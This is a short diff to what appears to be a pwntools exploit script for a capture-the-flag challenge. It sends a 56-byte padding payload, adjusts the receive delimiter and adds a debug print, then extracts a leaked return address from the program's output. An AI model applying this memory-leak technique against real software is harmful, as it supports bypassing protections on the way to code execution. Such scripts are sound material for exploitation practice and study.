@@ -8,7 +8,7 @@ payload = b'A' * 56
 p.sendafter(b"name? ", payload)
 
 # Step 2:  next question
-data = p.recvuntil(b"room number", drop=True)
+data = p.recvuntil(b"\nWhat's the room number", drop=True)
 print(f"[leaked raw output] {data}")
 
 # Step 3: leaked string
@@ -17,6 +17,7 @@ if index == -1:
     log.error("Did not find A*56 in output")
     exit(1)
 
+print(f'get data: {data}')
 # Step 4: get return address 8 bytes
 ret_bytes = data[index + 56 : index + 64]
 ret_addr = u64(ret_bytes.ljust(8, b'\x00'))
